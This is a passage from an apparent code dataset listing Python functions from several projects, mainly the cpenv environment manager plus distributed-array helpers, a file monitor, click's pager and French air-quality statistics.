            "def create(name_or_path=None, config=None):\n    '''Create a virtual environment. You can pass either the name of a new\n    environment to create in your CPENV_HOME directory OR specify a full path\n    to create an environment outisde your CPENV_HOME.\n\n    Create an environment in CPENV_HOME::\n\n        >>> cpenv.create('myenv')\n\n    Create an environment elsewhere::\n\n        >>> cpenv.create('~/custom_location/myenv')\n\n    :param name_or_path: Name or full path of environment\n    :param config: Environment configuration including dependencies etc...\n    '''\n\n    # Get the real path of the environment\n    if utils.is_system_path(name_or_path):\n        path = unipath(name_or_path)\n    else:\n        path = unipath(get_home_path(), name_or_path)\n\n    if os.path.exists(path):\n        raise OSError('{} already exists'.format(path))\n\n    env = VirtualEnvironment(path)\n    utils.ensure_path_exists(env.path)\n\n    if config:\n        if utils.is_git_repo(config):\n            Git('').clone(config, env.path)\n        else:\n            shutil.copy2(config, env.config_path)\n    else:\n        with open(env.config_path, 'w') as f:\n            f.write(defaults.environment_config)\n\n    utils.ensure_path_exists(env.hook_path)\n    utils.ensure_path_exists(env.modules_path)\n\n    env.run_hook('precreate')\n\n    virtualenv.create_environment(env.path)\n    if not utils.is_home_environment(env.path):\n        EnvironmentCache.add(env)\n        EnvironmentCache.save()\n\n    try:\n        env.update()\n    except:\n        utils.rmtree(path)\n        logger.debug('Failed to update, rolling back...')\n        raise\n    else:\n        env.run_hook('postcreate')\n\n    return env"
        ],
        [
            "def remove(name_or_path):\n    '''Remove an environment or module\n\n    :param name_or_path: name or path to environment or module\n    '''\n\n    r = resolve(name_or_path)\n    r.resolved[0].remove()\n\n    EnvironmentCache.discard(r.resolved[0])\n    EnvironmentCache.save()"
        ],
        [
            "def launch(module_name, *args, **kwargs):\n    '''Activates and launches a module\n\n    :param module_name: name of module to launch\n    '''\n\n    r = resolve(module_name)\n    r.activate()\n    mod = r.resolved[0]\n    mod.launch(*args, **kwargs)"
        ],
        [
            "def deactivate():\n    '''Deactivates an environment by restoring all env vars to a clean state\n    stored prior to activating environments\n    '''\n\n    if 'CPENV_ACTIVE' not in os.environ or 'CPENV_CLEAN_ENV' not in os.environ:\n        raise EnvironmentError('Can not deactivate environment...')\n\n    utils.restore_env_from_file(os.environ['CPENV_CLEAN_ENV'])"
        ],
        [
            "def get_modules():\n    '''Returns a list of available modules.'''\n\n    modules = set()\n\n    cwd = os.getcwd()\n    for d in os.listdir(cwd):\n\n        if d == 'module.yml':\n            modules.add(Module(cwd))\n\n        path = unipath(cwd, d)\n        if utils.is_module(path):\n            modules.add(Module(cwd))\n\n    module_paths = get_module_paths()\n    for module_path in module_paths:\n        for d in os.listdir(module_path):\n\n            path = unipath(module_path, d)\n            if utils.is_module(path):\n                modules.add(Module(path))\n\n    return sorted(list(modules), key=lambda x: x.name)"
        ],
        [
            "def add_active_module(module):\n    '''Add a module to CPENV_ACTIVE_MODULES environment variable'''\n\n    modules = set(get_active_modules())\n    modules.add(module)\n    new_modules_path = os.pathsep.join([m.path for m in modules])\n    os.environ['CPENV_ACTIVE_MODULES'] = str(new_modules_path)"
        ],
        [
            "def rem_active_module(module):\n    '''Remove a module from CPENV_ACTIVE_MODULES environment variable'''\n\n    modules = set(get_active_modules())\n    modules.discard(module)\n    new_modules_path = os.pathsep.join([m.path for m in modules])\n    os.environ['CPENV_ACTIVE_MODULES'] = str(new_modules_path)"
        ],
        [
            "def format_objects(objects, children=False, columns=None, header=True):\n    '''Format a list of environments and modules for terminal output'''\n\n    columns = columns or ('NAME', 'TYPE', 'PATH')\n    objects = sorted(objects, key=_type_and_name)\n    data = []\n    for obj in objects:\n        if isinstance(obj, cpenv.VirtualEnvironment):\n            data.append(get_info(obj))\n            modules = obj.get_modules()\n            if children and modules:\n                for mod in modules:\n                    data.append(get_info(mod, indent=2, root=obj.path))\n        else:\n            data.append(get_info(obj))\n\n    maxes = [len(max(col, key=len)) for col in zip(*data)]\n    tmpl = '{:%d}  {:%d}  {:%d}' % tuple(maxes)\n    lines = []\n    if header:\n        lines.append('\\n' + bold_blue(tmpl.format(*columns)))\n\n    for obj_data in data:\n        lines.append(tmpl.format(*obj_data))\n\n    return '\\n'.join(lines)"
        ],
        [
            "def info():\n    '''Show context info'''\n\n    env = cpenv.get_active_env()\n    modules = []\n    if env:\n        modules = env.get_modules()\n    active_modules = cpenv.get_active_modules()\n\n    if not env and not modules and not active_modules:\n        click.echo('\\nNo active modules...')\n        return\n\n    click.echo(bold('\\nActive modules'))\n    if env:\n        click.echo(format_objects([env] + active_modules))\n\n        available_modules = set(modules) - set(active_modules)\n        if available_modules:\n\n            click.echo(\n                bold('\\nInactive modules in {}\\n').format(cyan(env.name))\n            )\n            click.echo(format_objects(available_modules, header=False))\n\n    else:\n        click.echo(format_objects(active_modules))\n\n    available_shared_modules = set(cpenv.get_modules()) - set(active_modules)\n    if not available_shared_modules:\n        return\n\n    click.echo(bold('\\nInactive shared modules \\n'))\n    click.echo(format_objects(available_shared_modules, header=False))"
        ],
        [
            "def activate(paths, skip_local, skip_shared):\n    '''Activate an environment'''\n\n\n    if not paths:\n        ctx = click.get_current_context()\n        if cpenv.get_active_env():\n            ctx.invoke(info)\n            return\n\n        click.echo(ctx.get_help())\n        examples = (\n            '\\nExamples: \\n'\n            '    cpenv activate my_env\\n'\n            '    cpenv activate ./relative/path/to/my_env\\n'\n            '    cpenv activate my_env my_module\\n'\n        )\n        click.echo(examples)\n        return\n\n    if skip_local:\n        cpenv.module_resolvers.remove(cpenv.resolver.module_resolver)\n        cpenv.module_resolvers.remove(cpenv.resolver.active_env_module_resolver)\n\n    if skip_shared:\n        cpenv.module_resolvers.remove(cpenv.resolver.modules_path_resolver)\n\n    try:\n        r = cpenv.resolve(*paths)\n    except cpenv.ResolveError as e:\n        click.echo('\\n' + str(e))\n        return\n\n    resolved = set(r.resolved)\n    active_modules = set()\n    env = cpenv.get_active_env()\n    if env:\n        active_modules.add(env)\n    active_modules.update(cpenv.get_active_modules())\n\n    new_modules = resolved - active_modules\n    old_modules = active_modules & resolved\n\n    if old_modules and not new_modules:\n        click.echo(\n            '\\nModules already active: '\n            + bold(' '.join([obj.name for obj in old_modules]))\n        )\n        return\n\n    if env and contains_env(new_modules):\n        click.echo('\\nUse bold(exit) to leave your active environment first.')\n        return\n\n    click.echo('\\nResolved the following modules...')\n    click.echo(format_objects(r.resolved))\n    r.activate()\n    click.echo(blue('\\nLaunching subshell...'))\n\n    modules = sorted(resolved | active_modules, key=_type_and_name)\n    prompt = ':'.join([obj.name for obj in modules])\n    shell.launch(prompt)"
        ],
        [
            "def create(name_or_path, config):\n    '''Create a new environment.'''\n\n    if not name_or_path:\n        ctx = click.get_current_context()\n        click.echo(ctx.get_help())\n        examples = (\n            '\\nExamples:\\n'\n            '    cpenv create my_env\\n'\n            '    cpenv create ./relative/path/to/my_env\\n'\n            '    cpenv create my_env --config ./relative/path/to/config\\n'\n            '    cpenv create my_env --config git@github.com:user/config.git\\n'\n        )\n        click.echo(examples)\n        return\n\n    click.echo(\n        blue('Creating a new virtual environment ' + name_or_path)\n    )\n    try:\n        env = cpenv.create(name_or_path, config)\n    except Exception as e:\n        click.echo(bold_red('FAILED TO CREATE ENVIRONMENT!'))\n        click.echo(e)\n    else:\n        click.echo(bold_green('Successfully created environment!'))\n    click.echo(blue('Launching subshell'))\n\n    cpenv.activate(env)\n    shell.launch(env.name)"
        ],
        [
            "def remove(name_or_path):\n    '''Remove an environment'''\n\n    click.echo()\n    try:\n        r = cpenv.resolve(name_or_path)\n    except cpenv.ResolveError as e:\n        click.echo(e)\n        return\n\n    obj = r.resolved[0]\n    if not isinstance(obj, cpenv.VirtualEnvironment):\n        click.echo('{} is a module. Use `cpenv module remove` instead.')\n        return\n\n    click.echo(format_objects([obj]))\n    click.echo()\n\n    user_confirmed = click.confirm(\n        red('Are you sure you want to remove this environment?')\n    )\n    if user_confirmed:\n        click.echo('Attempting to remove...', nl=False)\n\n        try:\n            obj.remove()\n        except Exception as e:\n            click.echo(bold_red('FAIL'))\n            click.echo(e)\n        else:\n            click.echo(bold_green('OK!'))"
        ],
        [
            "def add(path):\n    '''Add an environment to the cache. Allows you to activate the environment\n    by name instead of by full path'''\n\n    click.echo('\\nAdding {} to cache......'.format(path), nl=False)\n    try:\n        r = cpenv.resolve(path)\n    except Exception as e:\n        click.echo(bold_red('FAILED'))\n        click.echo(e)\n        return\n\n    if isinstance(r.resolved[0], cpenv.VirtualEnvironment):\n        EnvironmentCache.add(r.resolved[0])\n        EnvironmentCache.save()\n        click.echo(bold_green('OK!'))"
        ],
        [
            "def remove(path):\n    '''Remove a cached environment. Removed paths will no longer be able to\n    be activated by name'''\n\n    r = cpenv.resolve(path)\n    if isinstance(r.resolved[0], cpenv.VirtualEnvironment):\n        EnvironmentCache.discard(r.resolved[0])\n        EnvironmentCache.save()"
        ],
        [
            "def create(name_or_path, config):\n    '''Create a new template module.\n\n    You can also specify a filesystem path like \"./modules/new_module\"\n    '''\n\n    click.echo('Creating module {}...'.format(name_or_path), nl=False)\n    try:\n        module = cpenv.create_module(name_or_path, config)\n    except Exception as e:\n        click.echo(bold_red('FAILED'))\n        raise\n    else:\n        click.echo(bold_green('OK!'))\n        click.echo('Browse to your new module and make some changes.')\n        click.echo(\"When you're ready add the module to an environment:\")\n        click.echo('    cpenv module add my_module ./path/to/my_module')\n        click.echo('Or track your module on git and add it directly from the repo:')\n        click.echo('    cpenv module add my_module git@github.com:user/my_module.git')"
        ],
        [
            "def add(name, path, branch, type):\n    '''Add a module to an environment. PATH can be a git repository path or\n    a filesystem path. '''\n\n    if not name and not path:\n        ctx = click.get_current_context()\n        click.echo(ctx.get_help())\n        examples = (\n            '\\nExamples:\\n'\n            '    cpenv module add my_module ./path/to/my_module\\n'\n            '    cpenv module add my_module git@github.com:user/my_module.git'\n            '    cpenv module add my_module git@github.com:user/my_module.git --branch=master --type=shared'\n        )\n        click.echo(examples)\n        return\n\n    if not name:\n        click.echo('Missing required argument: name')\n        return\n\n    if not path:\n        click.echo('Missing required argument: path')\n\n    env = cpenv.get_active_env()\n    if type=='local':\n        if not env:\n            click.echo('\\nActivate an environment to add a local module.\\n')\n            return\n\n        if click.confirm('\\nAdd {} to active env {}?'.format(name, env.name)):\n            click.echo('Adding module...', nl=False)\n            try:\n                env.add_module(name, path, branch)\n            except:\n                click.echo(bold_red('FAILED'))\n                raise\n            else:\n                click.echo(bold_green('OK!'))\n\n        return\n\n    module_paths = cpenv.get_module_paths()\n    click.echo('\\nAvailable module paths:\\n')\n    for i, mod_path in enumerate(module_paths):\n        click.echo('    {}. {}'.format(i, mod_path))\n    choice = click.prompt(\n        'Where do you want to add your module?',\n        type=int,\n        default=0\n    )\n    module_root = module_paths[choice]\n    module_path = utils.unipath(module_root, name)\n    click.echo('Creating module {}...'.format(module_path), nl=False)\n    try:\n        cpenv.create_module(module_path, path, branch)\n    except:\n        click.echo(bold_red('FAILED'))\n        raise\n    else:\n        click.echo(bold_green('OK!'))"
        ],
        [
            "def localize(name):\n    '''Copy a global module to the active environment.'''\n\n    env = cpenv.get_active_env()\n    if not env:\n        click.echo('You need to activate an environment first.')\n        return\n\n    try:\n        r = cpenv.resolve(name)\n    except cpenv.ResolveError as e:\n        click.echo('\\n' + str(e))\n\n    module = r.resolved[0]\n    if isinstance(module, cpenv.VirtualEnvironment):\n        click.echo('\\nCan only localize a module not an environment')\n        return\n\n    active_modules = cpenv.get_active_modules()\n    if module in active_modules:\n        click.echo('\\nCan not localize an active module.')\n        return\n\n    if module in env.get_modules():\n        click.echo('\\n{} is already local to {}'.format(module.name, env.name))\n        return\n\n    if click.confirm('\\nAdd {} to env {}?'.format(module.name, env.name)):\n        click.echo('Adding module...', nl=False)\n        try:\n            module = env.add_module(module.name, module.path)\n        except:\n            click.echo(bold_red('FAILED'))\n            raise\n        else:\n            click.echo(bold_green('OK!'))\n\n    click.echo('\\nActivate the localize module:')\n    click.echo('    cpenv activate {} {}'.format(env.name, module.name))"
        ],
        [
            "def path_resolver(resolver, path):\n    '''Resolves VirtualEnvironments with a relative or absolute path'''\n\n    path = unipath(path)\n\n    if is_environment(path):\n        return VirtualEnvironment(path)\n\n    raise ResolveError"
        ],
        [
            "def home_resolver(resolver, path):\n    '''Resolves VirtualEnvironments in CPENV_HOME'''\n\n    from .api import get_home_path\n\n    path = unipath(get_home_path(), path)\n\n    if is_environment(path):\n        return VirtualEnvironment(path)\n\n    raise ResolveError"
        ],
        [
            "def cache_resolver(resolver, path):\n    '''Resolves VirtualEnvironments in EnvironmentCache'''\n\n    env = resolver.cache.find(path)\n    if env:\n        return env\n\n    raise ResolveError"
        ],
        [
            "def module_resolver(resolver, path):\n    '''Resolves module in previously resolved environment.'''\n\n    if resolver.resolved:\n\n        if isinstance(resolver.resolved[0], VirtualEnvironment):\n            env = resolver.resolved[0]\n            mod = env.get_module(path)\n\n            if mod:\n                return mod\n\n    raise ResolveError"
        ],
        [
            "def active_env_module_resolver(resolver, path):\n    '''Resolves modules in currently active environment.'''\n\n    from .api import get_active_env\n\n    env = get_active_env()\n    if not env:\n        raise ResolveError\n\n    mod = env.get_module(path)\n    if not mod:\n        raise ResolveError\n\n    return mod"
        ],
        [
            "def redirect_resolver(resolver, path):\n    '''Resolves environment from .cpenv file...recursively walks up the tree\n    in attempt to find a .cpenv file'''\n\n    if not os.path.exists(path):\n        raise ResolveError\n\n    if os.path.isfile(path):\n        path = os.path.dirname(path)\n\n    for root, _, _ in walk_up(path):\n        if is_redirecting(root):\n            env_paths = redirect_to_env_paths(unipath(root, '.cpenv'))\n            r = Resolver(*env_paths)\n            return r.resolve()\n\n    raise ResolveError"
        ],
        [
            "def transpose(a, axes=None):\n    \"\"\"Returns a view of the array with axes transposed.\n\n    For a 1-D array, this has no effect.\n    For a 2-D array, this is the usual matrix transpose.\n    For an n-D array, if axes are given, their order indicates how the\n    axes are permuted\n\n    Args:\n      a (array_like): Input array.\n      axes (list of int, optional): By default, reverse the dimensions,\n        otherwise permute the axes according to the values given.\n    \"\"\"\n    if isinstance(a, np.ndarray):\n        return np.transpose(a, axes)\n    elif isinstance(a, RemoteArray):\n        return a.transpose(*axes)\n    elif isinstance(a, Remote):\n        return _remote_to_array(a).transpose(*axes)\n    elif isinstance(a, DistArray):\n        if axes is None:\n            axes = range(a.ndim - 1, -1, -1)\n        axes = list(axes)\n        if len(set(axes)) < len(axes):\n            raise ValueError(\"repeated axis in transpose\")\n        if sorted(axes) != list(range(a.ndim)):\n            raise ValueError(\"axes don't match array\")\n        distaxis = a._distaxis\n        new_distaxis = axes.index(distaxis)\n        new_subarrays = [ra.transpose(*axes) for ra in a._subarrays]\n        return DistArray(new_subarrays, new_distaxis)\n    else:\n        return np.transpose(a, axes)"
        ],
        [
            "def rollaxis(a, axis, start=0):\n    \"\"\"Roll the specified axis backwards, until it lies in a given position.\n\n    Args:\n      a (array_like): Input array.\n      axis (int): The axis to roll backwards.  The positions of the other axes \n        do not change relative to one another.\n      start (int, optional): The axis is rolled until it lies before this \n        position.  The default, 0, results in a \"complete\" roll.\n\n    Returns:\n      res (ndarray)\n    \"\"\"\n    if isinstance(a, np.ndarray):\n        return np.rollaxis(a, axis, start)\n    if axis not in range(a.ndim):\n        raise ValueError(\n                'rollaxis: axis (%d) must be >=0 and < %d' % (axis, a.ndim))\n    if start not in range(a.ndim + 1):\n        raise ValueError(\n                'rollaxis: start (%d) must be >=0 and < %d' % (axis, a.ndim+1))\n    axes = list(range(a.ndim))\n    axes.remove(axis)\n    axes.insert(start, axis)\n    return transpose(a, axes)"
        ],
        [
            "def expand_dims(a, axis):\n    \"\"\"Insert a new axis, corresponding to a given position in the array shape\n\n    Args:\n      a (array_like): Input array.\n      axis (int): Position (amongst axes) where new axis is to be inserted.\n    \"\"\"\n    if hasattr(a, 'expand_dims') and hasattr(type(a), '__array_interface__'):\n        return a.expand_dims(axis)\n    else:\n        return np.expand_dims(a, axis)"
        ],
        [
            "def concatenate(tup, axis=0):\n    \"\"\"Join a sequence of arrays together. \n    Will aim to join `ndarray`, `RemoteArray`, and `DistArray` without moving \n    their data, if they happen to be on different engines.\n\n    Args:\n      tup (sequence of array_like): Arrays to be concatenated. They must have\n        the same shape, except in the dimension corresponding to `axis`.\n      axis (int, optional): The axis along which the arrays will be joined.\n\n    Returns: \n      res: `ndarray`, if inputs were all local\n           `RemoteArray`, if inputs were all on the same remote engine\n           `DistArray`, if inputs were already scattered on different engines\n    \"\"\"\n    from distob import engine\n    if len(tup) is 0:\n        raise ValueError('need at least one array to concatenate')\n    first = tup[0]\n    others = tup[1:]\n    # allow subclasses to provide their own implementations of concatenate:\n    if (hasattr(first, 'concatenate') and \n            hasattr(type(first), '__array_interface__')):\n        return first.concatenate(others, axis)\n    # convert all arguments to arrays/RemoteArrays if they are not already:\n    arrays = []\n    for ar in tup:\n        if isinstance(ar, DistArray):\n            if axis == ar._distaxis:\n                arrays.extend(ar._subarrays)\n            else:\n                # Since not yet implemented arrays distributed on more than\n                # one axis, will fetch and re-scatter on the new axis:\n                arrays.append(gather(ar))\n        elif isinstance(ar, RemoteArray):\n            arrays.append(ar)\n        elif isinstance(ar, Remote):\n            arrays.append(_remote_to_array(ar))\n        elif hasattr(type(ar), '__array_interface__'):\n            # then treat as a local ndarray\n            arrays.append(ar)\n        else:\n            arrays.append(np.array(ar))\n    if all(isinstance(ar, np.ndarray) for ar in arrays):\n        return np.concatenate(arrays, axis)\n    total_length = 0\n    # validate dimensions are same, except for axis of concatenation:\n    commonshape = list(arrays[0].shape)\n    commonshape[axis] = None # ignore this axis for shape comparison\n    for ar in arrays:\n        total_length += ar.shape[axis]\n        shp = list(ar.shape)\n        shp[axis] = None\n        if shp != commonshape:\n            raise ValueError('incompatible shapes for concatenation')\n    # set sensible target block size if splitting subarrays further:\n    blocksize = ((total_length - 1) // engine.nengines) + 1\n    rarrays = []\n    for ar in arrays:\n        if isinstance(ar, DistArray):\n            rarrays.extend(ar._subarrays)\n        elif isinstance(ar, RemoteArray):\n            rarrays.append(ar)\n        else:\n            da = _scatter_ndarray(ar, axis, blocksize)\n            for ra in da._subarrays:\n                rarrays.append(ra)\n            del da\n    del arrays\n    # At this point rarrays is a list of RemoteArray to be concatenated\n    eid = rarrays[0]._id.engine\n    if all(ra._id.engine == eid for ra in rarrays):\n        # Arrays to be joined are all on the same engine\n        if eid == engine.eid:\n            # Arrays are all local\n            return concatenate([gather(r) for r in rarrays], axis)\n        else:\n            return call(concatenate, rarrays, axis)\n    else:\n        # Arrays to be joined are on different engines.\n        # TODO: consolidate any consecutive arrays already on same engine\n        return DistArray(rarrays, axis)"
        ],
        [
            "def _broadcast_shape(*args):\n    \"\"\"Return the shape that would result from broadcasting the inputs\"\"\"\n    #TODO: currently incorrect result if a Sequence is provided as an input\n    shapes = [a.shape if hasattr(type(a), '__array_interface__')\n              else () for a in args]\n    ndim = max(len(sh) for sh in shapes) # new common ndim after broadcasting\n    for i, sh in enumerate(shapes):\n        if len(sh) < ndim:\n            shapes[i] = (1,)*(ndim - len(sh)) + sh\n    return tuple(max(sh[ax] for sh in shapes) for ax in range(ndim))"
        ],
        [
            "def mean(a, axis=None, dtype=None, out=None, keepdims=False):\n    \"\"\"\n    Compute the arithmetic mean along the specified axis.\n\n    Returns the average of the array elements.  The average is taken over\n    the flattened array by default, otherwise over the specified axis.\n    `float64` intermediate and return values are used for integer inputs.\n\n    Parameters\n    ----------\n    a : array_like\n        Array containing numbers whose mean is desired. If `a` is not an\n        array, a conversion is attempted.\n    axis : None or int or tuple of ints, optional\n        Axis or axes along which the means are computed. The default is to\n        compute the mean of the flattened array.\n        If this is a tuple of ints, a mean is performed over multiple axes,\n        instead of a single axis or all the axes as before.\n    dtype : data-type, optional\n        Type to use in computing the mean.  For integer inputs, the default\n        is `float64`; for floating point inputs, it is the same as the\n        input dtype.\n    out : ndarray, optional\n        Alternate output array in which to place the result.  The default\n        is ``None``; if provided, it must have the same shape as the\n        expected output, but the type will be cast if necessary.\n        See `doc.ufuncs` for details.\n    keepdims : bool, optional\n        If this is set to True, the axes which are reduced are left\n        in the result as dimensions with size one. With this option,\n        the result will broadcast correctly against the original `arr`.\n\n    Returns\n    -------\n    m : ndarray, see dtype parameter above\n\n    Notes\n    -----\n    np.mean fails to pass the keepdims parameter to ndarray subclasses.\n    That is the main reason we implement this function.\n    \"\"\"\n    if (isinstance(a, np.ndarray) or\n            isinstance(a, RemoteArray) or\n            isinstance(a, DistArray)):\n        return a.mean(axis=axis, dtype=dtype, out=out, keepdims=keepdims)\n    else:\n        return np.mean(a, axis=axis, dtype=dtype, out=out, keepdims=keepdims)"
        ],
        [
            "def _valid_distaxis(shapes, ax):\n        \"\"\"`ax` is a valid candidate for a distributed axis if the given\n        subarray shapes are all the same when ignoring axis `ax`\"\"\"\n        compare_shapes = np.vstack(shapes)\n        if ax < compare_shapes.shape[1]:\n            compare_shapes[:, ax] = -1\n        return np.count_nonzero(compare_shapes - compare_shapes[0]) == 0"
        ],
        [
            "def run(*args, **kwargs):\n    '''Returns True if successful, False if failure'''\n\n    kwargs.setdefault('env', os.environ)\n    kwargs.setdefault('shell', True)\n\n    try:\n        subprocess.check_call(' '.join(args), **kwargs)\n        return True\n    except subprocess.CalledProcessError:\n        logger.debug('Error running: {}'.format(args))\n        return False"
        ],
        [
            "def cmd():\n    '''Return a command to launch a subshell'''\n\n    if platform == 'win':\n        return ['cmd.exe', '/K']\n\n    elif platform == 'linux':\n        ppid = os.getppid()\n        ppid_cmdline_file = '/proc/{0}/cmdline'.format(ppid)\n        try:\n            with open(ppid_cmdline_file) as f:\n                cmd = f.read()\n            if cmd.endswith('\\x00'):\n                cmd = cmd[:-1]\n            cmd = cmd.split('\\x00')\n            return cmd + [binpath('subshell.sh')]\n        except:\n            cmd = 'bash'\n\n    else:\n        cmd = 'bash'\n\n    return [cmd, binpath('subshell.sh')]"
        ],
        [
            "def prompt(prefix=None, colored=True):\n    '''Generate a prompt with a given prefix\n\n    linux/osx: [prefix] user@host cwd $\n          win: [prefix] cwd:\n    '''\n\n    if platform == 'win':\n        return '[{0}] $P$G'.format(prefix)\n    else:\n        if colored:\n            return (\n                '[{0}] '  # White prefix\n                '\\\\[\\\\033[01;32m\\\\]\\\\u@\\\\h\\\\[\\\\033[00m\\\\] '  # Green user@host\n                '\\\\[\\\\033[01;34m\\\\]\\\\w $ \\\\[\\\\033[00m\\\\]'  # Blue cwd $\n            ).format(prefix)\n        return '[{0}] \\\\u@\\\\h \\\\w $ '.format(prefix)"
        ],
        [
            "def launch(prompt_prefix=None):\n    '''Launch a subshell'''\n\n    if prompt_prefix:\n        os.environ['PROMPT'] = prompt(prompt_prefix)\n\n    subprocess.call(cmd(), env=os.environ.data)"
        ],
        [
            "def add_file(self, file, **kwargs):\n        \"\"\"Append a file to file repository.\n\n        For file monitoring, monitor instance needs file.\n        Please put the name of file to `file` argument.\n\n        :param file: the name of file you want monitor.\n\n        \"\"\"\n\n        if os.access(file, os.F_OK):\n\n            if file in self.f_repository:\n                raise DuplicationError(\"file already added.\")\n\n            self.f_repository.append(file)\n\n        else:\n            raise IOError(\"file not found.\")"
        ],
        [
            "def add_files(self, filelist, **kwargs):\n        \"\"\"Append files to file repository.\n        \n        ModificationMonitor can append files to repository using this.\n        Please put the list of file names to `filelist` argument.\n\n        :param filelist: the list of file nmaes\n        \"\"\"\n\n        # check filelist is list type\n        if not isinstance(filelist, list):\n            raise TypeError(\"request the list type.\")\n\n        for file in filelist:\n            self.add_file(file)"
        ],
        [
            "def monitor(self, sleep=5):\n        \"\"\"Run file modification monitor.\n\n        The monitor can catch file modification using timestamp and file body. \n        Monitor has timestamp data and file body data. And insert timestamp \n        data and file body data before into while roop. In while roop, monitor \n        get new timestamp and file body, and then monitor compare new timestamp\n        to originaltimestamp. If new timestamp and file body differ original,\n        monitor regard thease changes as `modification`. Then monitor create\n        instance of FileModificationObjectManager and FileModificationObject,\n        and monitor insert FileModificationObject to FileModificationObject-\n        Manager. Then, yield this object.\n\n        :param sleep: How times do you sleep in while roop.\n        \"\"\"\n\n\n        manager = FileModificationObjectManager()\n\n        timestamps = {}\n        filebodies = {}\n\n        # register original timestamp and filebody to dict\n        for file in self.f_repository:\n            timestamps[file] = self._get_mtime(file)\n            filebodies[file] = open(file).read()\n\n\n        while True:\n\n            for file in self.f_repository:\n\n                mtime = timestamps[file]\n                fbody = filebodies[file]\n\n                modified = self._check_modify(file, mtime, fbody)\n\n                # file not modify -> continue\n                if not modified:\n                    continue\n\n                # file modifies -> create the modification object\n\n                new_mtime = self._get_mtime(file)\n                new_fbody = open(file).read()\n\n                obj = FileModificationObject(\n                        file,\n                        (mtime, new_mtime),\n                        (fbody, new_fbody) )\n\n                # overwrite new timestamp and filebody\n                timestamps[file] = new_mtime\n                filebodies[file] = new_fbody\n\n\n                # append file modification object to manager\n                manager.add_object(obj)\n\n                # return new modification object\n                yield obj\n\n            time.sleep(sleep)"
        ],
        [
            "def status_job(self, fn=None, name=None, timeout=3):\n        \"\"\"Decorator that invokes `add_status_job`.\n\n        ::\n\n            @app.status_job\n            def postgresql():\n                # query/ping postgres\n\n            @app.status_job(name=\"Active Directory\")\n            def active_directory():\n                # query active directory\n\n            @app.status_job(timeout=5)\n            def paypal():\n                # query paypal, timeout after 5 seconds\n\n        \"\"\"\n        if fn is None:\n            def decorator(fn):\n                self.add_status_job(fn, name, timeout)\n            return decorator\n        else:\n            self.add_status_job(fn, name, timeout)"
        ],
        [
            "def _pipepager(text, cmd, color):\n    \"\"\"Page through text by feeding it to another program.  Invoking a\n    pager through this might support colors.\n    \"\"\"\n    import subprocess\n    env = dict(os.environ)\n\n    # If we're piping to less we might support colors under the\n    # condition that\n    cmd_detail = cmd.rsplit('/', 1)[-1].split()\n    if color is None and cmd_detail[0] == 'less':\n        less_flags = os.environ.get('LESS', '') + ' '.join(cmd_detail[1:])\n        if not less_flags:\n            env['LESS'] = '-R'\n            color = True\n        elif 'r' in less_flags or 'R' in less_flags:\n            color = True\n\n    if not color:\n        text = strip_ansi(text)\n\n    c = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE,\n                         env=env)\n    encoding = get_best_encoding(c.stdin)\n    try:\n        c.stdin.write(text.encode(encoding, 'replace'))\n        c.stdin.close()\n    except (IOError, KeyboardInterrupt):\n        pass\n\n    # Less doesn't respect ^C, but catches it for its own UI purposes (aborting\n    # search or other commands inside less).\n    #\n    # That means when the user hits ^C, the parent process (click) terminates,\n    # but less is still alive, paging the output and messing up the terminal.\n    #\n    # If the user wants to make the pager exit on ^C, they should set\n    # `LESS='-K'`. It's not our decision to make.\n    while True:\n        try:\n            c.wait()\n        except KeyboardInterrupt:\n            pass\n        else:\n            break"
        ],
        [
            "def profil_annuel(df, func='mean'):\n    \"\"\"\n    Calcul du profil annuel\n\n    Param\u00e8tres:\n    df: DataFrame de donn\u00e9es dont l'index est une s\u00e9rie temporelle\n        (cf module xair par exemple)\n    func: function permettant le calcul. Soit un nom de fonction numpy ('mean', 'max', ...)\n        soit la fonction elle-m\u00eame (np.mean, np.max, ...)\n    Retourne:\n    Un DataFrame de moyennes par mois\n    \"\"\"\n\n    func = _get_funky(func)\n    res = df.groupby(lambda x: x.month).aggregate(func)\n    # On met des noms de mois \u00e0 la place des num\u00e9ros dans l'index\n    res.index = [cal.month_name[i] for i in range(1,13)]\n    return res"
        ],
        [
            "def run_global_hook(hook_name, *args):\n    '''Attempt to run a global hook by name with args'''\n\n    hook_finder = HookFinder(get_global_hook_path())\n    hook = hook_finder(hook_name)\n    if hook:\n        hook.run(*args)"
        ],
        [
            "def moyennes_glissantes(df, sur=8, rep=0.75):\n    \"\"\"\n    Calcule de moyennes glissantes\n\n    Param\u00e8tres:\n    df: DataFrame de mesures sur lequel appliqu\u00e9 le calcul\n    sur: (int, par d\u00e9faut 8) Nombre d'observations sur lequel s'appuiera le\n    calcul\n    rep: (float, d\u00e9faut 0.75) Taux de r\u00e9pr\u00e9sentativit\u00e9 en dessous duquel le\n    calcul renverra NaN\n\n    Retourne:\n    Un DataFrame des moyennes glissantes calcul\u00e9es\n    \"\"\"\n    return pd.rolling_mean(df, window=sur, min_periods=rep * sur)"
        ],
        [
            "def aot40_vegetation(df, nb_an):\n    \"\"\"\n    Calcul de l'AOT40 du 1er mai au 31 juillet\n\n    *AOT40 : AOT 40 ( exprim\u00e9 en micro g/m\u00b3 par heure ) signifie la somme des\n    diff\u00e9rences entre les concentrations horaires sup\u00e9rieures \u00e0 40 parties par\n    milliard ( 40 ppb soit 80 micro g/m\u00b3 ), durant une p\u00e9riode donn\u00e9e en\n    utilisant uniquement les valeurs sur 1 heure mesur\u00e9es quotidiennement\n    entre 8 heures (d\u00e9but de la mesure) et 20 heures (pile, fin de la mesure) CET,\n    ce qui correspond \u00e0 de 8h \u00e0 19h TU (donnant bien 12h de mesures, 8h donnant\n    la moyenne horaire de 7h01 \u00e0 8h00)\n\n    Param\u00e8tres:\n    df: DataFrame de mesures sur lequel appliqu\u00e9 le calcul\n    nb_an: (int) Nombre d'ann\u00e9es contenu dans le df, et servant \u00e0 diviser le\n    r\u00e9sultat retourn\u00e9\n\n    Retourne:\n    Un DataFrame de r\u00e9sultat de calcul\n    \"\"\"\n\n    return _aot(df.tshift(1), nb_an=nb_an, limite=80, mois_debut=5, mois_fin=7,\n                heure_debut=8, heure_fin=19)"
        ],
        [
            "def validate(self):\n        '''Validate all the entries in the environment cache.'''\n\n        for env in list(self):\n            if not env.exists:\n                self.remove(env)"
        ],
        [
